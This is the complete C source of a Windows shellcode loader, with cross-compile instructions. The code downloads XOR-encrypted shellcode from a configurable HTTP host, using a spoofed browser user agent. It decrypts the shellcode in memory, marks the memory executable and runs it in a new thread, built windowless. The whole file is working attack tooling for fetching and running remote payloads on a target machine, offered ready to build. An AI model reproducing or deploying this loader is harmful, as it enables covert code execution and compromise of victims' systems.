/*
 * loader.c — WinHTTP shellcode loader
 *
 * Downloads XOR-encrypted shellcode from PayloadURL, decrypts it in-memory
 * with a 4-byte XOR key (XORKey, 8 hex chars), and executes via CreateThread.
 *
 * Build (Linux → Windows x64):
 *   x86_64-w64-mingw32-gcc loader.c -o loader.exe \
 *       -mwindows -O2 -s \
 *       -DPayloadURL=\"http://10.2.20.200:8080/x\" \
 *       -DXORKey=\"aabbccdd\" \
 *       -lwinhttp -lkernel32
 *
 * Override at compile time:
 *   -DPayloadURL="http://host:port/path"
 *   -DXORKey="deadbeef"   (exactly 8 hex chars = 4-byte key)
 */

#include <windows.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>

/* ── Compile-time constants (override with -D flags) ──────────────────────── */

#ifndef PayloadURL
#define PayloadURL "http://127.0.0.1:8080/payload"
#endif

#ifndef XORKey
#define XORKey "deadbeef"
#endif

/* ── Internal helpers ─────────────────────────────────────────────────────── */

/*
 * hex_to_byte — convert two ASCII hex digits to a byte value.
 * Returns 0 on invalid input.
 */
static unsigned char hex_to_byte(char hi, char lo) {
    unsigned char val = 0;
    if (hi >= '0' && hi <= '9') val = (hi - '0') << 4;
    else if (hi >= 'a' && hi <= 'f') val = (hi - 'a' + 10) << 4;
    else if (hi >= 'A' && hi <= 'F') val = (hi - 'A' + 10) << 4;
    if (lo >= '0' && lo <= '9') val |= (lo - '0');
    else if (lo >= 'a' && lo <= 'f') val |= (lo - 'a' + 10);
    else if (lo >= 'A' && lo <= 'F') val |= (lo - 'A' + 10);
    return val;
}

/*
 * parse_xor_key — decode the XORKey compile-time hex string into key[] and
 * returns the key length in bytes (0 on error).
 * Supports up to 32 bytes (64 hex chars); for our 4-byte default: 8 chars.
 */
static int parse_xor_key(const char *hex, unsigned char *out, int max_out) {
    int len = (int)strlen(hex);
    if (len < 2 || len % 2 != 0) return 0;
    int key_len = len / 2;
    if (key_len > max_out) key_len = max_out;
    for (int i = 0; i < key_len; i++) {
        out[i] = hex_to_byte(hex[2 * i], hex[2 * i + 1]);
    }
    return key_len;
}

/*
 * xor_decrypt — XOR buf[0..len-1] in-place with the repeating key.
 */
static void xor_decrypt(unsigned char *buf, SIZE_T len,
                        const unsigned char *key, int key_len) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= key[i % (SIZE_T)key_len];
    }
}

/* ── Download via WinHTTP ─────────────────────────────────────────────────── */

/*
 * download_payload — fetch URL using WinHTTP.
 * Allocates a heap buffer, fills it with the response body, and sets *out_len.
 * Returns NULL on any error; caller must LocalFree() the returned buffer.
 *
 * Supports http:// only (WINHTTP_FLAG_SECURE not set).
 * For https: pass port 443 and add WINHTTP_FLAG_SECURE to WinHttpOpenRequest.
 */
static unsigned char *download_payload(const char *url_str, SIZE_T *out_len) {
    *out_len = 0;

    /* --- parse URL into components (WinHttpCrackUrl requires wide strings) - */
    int wurl_len = MultiByteToWideChar(CP_ACP, 0, url_str, -1, NULL, 0);
    WCHAR *wurl = (WCHAR *)LocalAlloc(LMEM_FIXED, (SIZE_T)wurl_len * sizeof(WCHAR));
    if (!wurl) return NULL;
    MultiByteToWideChar(CP_ACP, 0, url_str, -1, wurl, wurl_len);

    URL_COMPONENTSW ucw;
    WCHAR wscheme[16] = {0};
    WCHAR whost[256]  = {0};
    WCHAR wpath[2048] = {0};
    ZeroMemory(&ucw, sizeof(ucw));
    ucw.dwStructSize      = sizeof(ucw);
    ucw.lpszScheme        = wscheme; ucw.dwSchemeLength   = (sizeof(wscheme) / sizeof(WCHAR)) - 1;
    ucw.lpszHostName      = whost;   ucw.dwHostNameLength = (sizeof(whost) / sizeof(WCHAR)) - 1;
    ucw.lpszUrlPath       = wpath;   ucw.dwUrlPathLength  = (sizeof(wpath) / sizeof(WCHAR)) - 1;

    if (!WinHttpCrackUrl(wurl, 0, 0, &ucw)) {
        LocalFree(wurl);
        return NULL;
    }

    INTERNET_PORT port = ucw.nPort;
    if (port == 0) {
        port = (ucw.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_DEFAULT_HTTPS_PORT
                                                       : INTERNET_DEFAULT_HTTP_PORT;
    }
    DWORD open_flags = (ucw.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;

    /* --- WinHTTP session --------------------------------------------------- */
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) { LocalFree(wurl); return NULL; }

    HINTERNET hConnect = WinHttpConnect(hSession, whost, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); LocalFree(wurl); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        wpath[0] ? wpath : L"/",
        NULL,                         /* HTTP/1.1 */
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        open_flags);
    LocalFree(wurl);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    if (!WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA,   0,
            0, 0)) {
        goto cleanup;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    /* --- read response body ------------------------------------------------ */
    unsigned char *body    = NULL;
    SIZE_T         body_sz = 0;

    DWORD avail = 0;
    DWORD read  = 0;
    do {
        avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (avail == 0) break;

        unsigned char *tmp = (unsigned char *)LocalReAlloc(
                body ? body : NULL,
                body_sz + avail,
                LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (!tmp) {
            if (body) LocalFree(body);
            body = NULL;
            break;
        }
        body = tmp;

        read = 0;
        if (!WinHttpReadData(hRequest, body + body_sz, avail, &read)) {
            LocalFree(body);
            body = NULL;
            break;
        }
        body_sz += read;
    } while (avail > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (body && body_sz > 0) {
        *out_len = body_sz;
        return body;
    }
    if (body) LocalFree(body);
    return NULL;

cleanup:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShow;

    /* 1. Decode the compile-time XOR key */
    unsigned char xor_key[32];
    int key_len = parse_xor_key(XORKey, xor_key, (int)sizeof(xor_key));
    if (key_len == 0) return 1;

    /* 2. Download encrypted shellcode */
    SIZE_T sc_len = 0;
    unsigned char *sc = download_payload(PayloadURL, &sc_len);
    if (!sc || sc_len == 0) return 1;

    /* 3. XOR decrypt in-place */
    xor_decrypt(sc, sc_len, xor_key, key_len);

    /* 4. Allocate RW memory and copy shellcode */
    unsigned char *exec_mem = (unsigned char *)VirtualAlloc(
            NULL, sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);
    if (!exec_mem) { LocalFree(sc); return 1; }

    memcpy(exec_mem, sc, sc_len);
    LocalFree(sc);

    /* 5. Flip to RX */
    DWORD old_prot = 0;
    if (!VirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, &old_prot)) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    /* 6. Execute via CreateThread + wait */
    HANDLE hThread = CreateThread(
            NULL, 0,
            (LPTHREAD_START_ROUTINE)exec_mem,
            NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    /* exec_mem intentionally not freed — shellcode may still reference it */
    return 0;
}
